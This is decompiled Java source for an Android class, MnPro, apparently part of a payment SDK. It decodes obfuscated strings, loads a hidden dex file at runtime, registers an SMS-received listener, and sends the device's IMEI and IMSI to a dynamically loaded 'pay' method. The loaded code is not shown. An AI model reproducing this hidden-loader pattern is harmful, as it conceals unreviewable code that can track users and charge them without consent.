package com.mn.kt;

import android.content.Context;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import com.mn.kt.a.a;
import com.mn.kt.rs.RsRe;
import dalvik.system.DexClassLoader;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
/* loaded from: classes.dex */
public class MnPro {

    /* renamed from: a  reason: collision with root package name */
    private static DexClassLoader f883a = null;
    private static a b = null;
    private static Context c = null;
    private static String d = "dERlZG";
    private static MnPro e = new MnPro();
    private static Handler f = null;
    private RsRe g;

    private MnPro() {
    }

    public static final MnPro getInstance() {
        return e;
    }

    public void setParams(int i, int i2, String str) {
        com.mn.kt.c.a.a();
        com.mn.kt.c.a.a(i, i2, str);
    }

    public void init(Context context, Handler handler) {
        c = context;
        f = handler;
        String str = String.valueOf(c.getFilesDir().getAbsolutePath()) + "/";
        a.a().a(context);
        com.mn.kt.d.a.a(c, d, c.getFilesDir().getAbsolutePath(), com.mn.kt.d.a.a("KlUEF1pdAFRYARs=", "z9qp332"));
        if (f883a == null) {
            f883a = new DexClassLoader(String.valueOf(str) + com.mn.kt.d.a.a("KlUEF1pdAFRYARs=", "z9qp332"), str, null, c.getClassLoader());
        }
        Context context2 = c;
        if (a(Build.VERSION.RELEASE, "4.4") >= 0) {
            if (com.mn.kt.d.a.h(context2).equals("1")) {
                this.g = new RsRe();
                IntentFilter intentFilter = new IntentFilter("android.intent.action.MOMS_SMS_RECEIVED");
                intentFilter.setPriority(-1);
                context2.registerReceiver(this.g, intentFilter);
            }
        }
        com.mn.kt.c.a.a().a(c, handler);
        com.mn.kt.c.a.a();
        b = com.mn.kt.c.a.b();
        com.mn.kt.c.a.a();
        com.mn.kt.c.a.c();
    }

    private static int a(String str, String str2) {
        int i;
        if (TextUtils.isEmpty(str) || TextUtils.isEmpty(str2)) {
            return 0;
        }
        String[] split = str.split("\\.");
        String[] split2 = str2.split("\\.");
        int length = split.length > split2.length ? split2.length : split.length;
        int i2 = 0;
        while (true) {
            if (i2 >= length) {
                i = 0;
                break;
            }
            int parseInt = Integer.parseInt(split[i2]);
            int parseInt2 = Integer.parseInt(split2[i2]);
            if (parseInt > parseInt2) {
                i = 1;
                break;
            } else if (parseInt < parseInt2) {
                i = -1;
                break;
            } else {
                i2++;
            }
        }
        if (i != 0) {
            return i;
        }
        if (split.length > split2.length) {
            return 1;
        }
        if (split.length < split2.length) {
            return -1;
        }
        return i;
    }

    public void exit() {
        if (this.g != null) {
            c.unregisterReceiver(this.g);
        }
        com.mn.kt.c.a.a().d();
    }

    public synchronized void start(Context context, String str, String str2) {
        try {
            Class loadClass = f883a.loadClass(com.mn.kt.d.a.a("AVpUFgdaDUcXSAJMTEZdU01cD0VVFidbMlRAawZHFFBL", "b598c5"));
            Method method = loadClass.getMethod("getInstance", new Class[0]);
            method.setAccessible(true);
            Object invoke = method.invoke(null, new Object[0]);
            String str3 = "pay = " + invoke.toString();
            com.mn.kt.d.a.d();
            Method method2 = loadClass.getMethod(com.mn.kt.d.a.a("CgMEBh1iVQAEAAYfW1cc", "yweti24"), Context.class, Integer.TYPE, String.class, String.class, String.class, Map.class);
            method2.setAccessible(true);
            HashMap hashMap = new HashMap();
            hashMap.put("imei", com.mn.kt.d.a.f(c));
            hashMap.put("imsi", com.mn.kt.d.a.d(c));
            method2.invoke(invoke, context, Integer.valueOf(b.b), b.f885a, str, str2, hashMap);
        } catch (Exception e2) {
            e2.printStackTrace();
            if (f != null) {
                Message obtain = Message.obtain();
                obtain.what = -1;
                Bundle bundle = new Bundle();
                bundle.putString("extdata", str2);
                bundle.putInt("errcode", 4102);
                obtain.setData(bundle);
                f.sendMessage(obtain);
            }
        }
    }

    public static Class a(Context context, String str) {
        if (f883a == null) {
            com.mn.kt.d.a.a(c, d, c.getFilesDir().getAbsolutePath(), com.mn.kt.d.a.a("KlUEF1pdAFRYARs=", "z9qp332"));
            String str2 = String.valueOf(context.getFilesDir().getAbsolutePath()) + "/";
            f883a = new DexClassLoader(String.valueOf(str2) + com.mn.kt.d.a.a("KlUEF1pdAFRYARs=", "z9qp332"), str2, null, context.getClassLoader());
            String str3 = "path=" + str2;
            com.mn.kt.d.a.d();
        }
        return f883a.loadClass(str);
    }
}
